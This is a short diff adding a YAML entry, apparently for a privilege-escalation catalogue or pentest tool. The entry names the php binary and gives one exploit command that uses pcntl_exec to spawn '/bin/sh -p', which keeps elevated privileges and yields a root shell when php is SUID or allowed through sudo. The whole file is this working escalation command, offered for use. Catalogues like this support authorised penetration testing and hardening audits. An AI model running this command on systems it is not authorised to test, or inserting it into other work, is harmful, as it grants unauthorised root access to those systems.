@@ -1,0 +1,4 @@
+name: php
+binary_path: /usr/bin/php
+exploit_cmds:
+- /usr/bin/php -r 'pcntl_exec("/bin/sh", ["-p"]);'
